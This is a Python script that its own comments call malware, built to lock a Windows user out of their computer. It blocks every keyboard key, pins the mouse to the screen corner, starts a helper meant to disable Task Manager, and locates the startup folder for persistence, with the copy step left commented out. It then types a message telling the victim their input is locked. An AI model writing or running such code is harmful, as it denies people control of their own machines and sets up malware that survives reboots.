# this will make it impossible to shut the malware down unless you access the file
# through a dual boot setup (with linux 👌❤) and delete the file.

import threading
import pyautogui
import time
import keyboard
import win32clipboard
from pynput.mouse import Controller
from termcolor import colored
import webbrowser
import subprocess

ntm = subprocess.Popen(["Documents\\Scripts\\python.exe", "noTaskMgr.py"])

#  definitions
def blockinput():
    global block_input_flag
    block_input_flag = 1
    t1 = threading.Thread(target=blockinput_start)
    t1.start()
    print(colored('[OK] ', 'cyan') + colored('INPUT BLOCKING INSTRUCTED', 'green'))


def unblockinput():
    blockinput_stop()
    print(colored('[OK] ', 'cyan') + colored('INPUT UNBLOCKING INSTRUCTED', 'red'))


def blockinput_start():
    mouse = Controller()
    global block_input_flag
    pyautogui.FAILSAFE = False
    for i in range(150):
        keyboard.block_key(i)
    while block_input_flag == 1:
        mouse.position = (0, 0)


def blockinput_stop():
    global block_input_flag
    for i in range(150):
        keyboard.unblock_key(i)
    block_input_flag = 0


blockinput()
print(colored('[OK] ', 'yellow') + colored('INPUT BLOCKING STARTED', 'green'))

# Open Microsoft Edge
pyautogui.press("win")
time.sleep(1)
pyautogui.write("cmd")
pyautogui.press("enter")
time.sleep(0.25)
pyautogui.write(r"C:\WINDOWS\system32\notepad.exe")
pyautogui.press("enter")

# webbrowser.open('http://sighclone.tech/', new=1)

time.sleep(1)
pyautogui.keyDown("alt")
pyautogui.keyDown("tab")
pyautogui.keyUp("alt")
pyautogui.keyUp("tab")
window = pyautogui.getActiveWindow()
window.close()

# The following is used to get this program into startup
pyautogui.keyDown("win")
pyautogui.keyDown("r")
time.sleep(0.1)
pyautogui.keyUp("r")
pyautogui.keyUp("win")
pyautogui.write("shell:startup")
pyautogui.press("enter")

x = 0
for x in range(0, 5):
    pyautogui.press("tab")
    time.sleep(0.5)
pyautogui.press("enter")
pyautogui.hotkey('ctrl', 'c')
win32clipboard.OpenClipboard()
startupPath = win32clipboard.GetClipboardData()
win32clipboard.CloseClipboard()

# Uncomment the following line of code to add the program to the windows startup list:
# copyfile(str(__file__), startupPath)

pyautogui.keyDown("alt")
pyautogui.press("tab")
pyautogui.keyUp("alt")
window.maximize()
pyautogui.write("Hello! Your keyboard and mouse are locked."
                "\nYou can long press the power button to force shut your system."
                "\n\nDo <whatever> to reset\n\n")

pyautogui.write(startupPath)
unblockinput()

ntm.wait()
# uncomment the following (2 lines) code for final use, doing this will block keyboard and mouse input
# unblockinput()
# print(colored('[OK] ', 'yellow') + colored('INPUT BLOCKING STOPPED', 'red'))
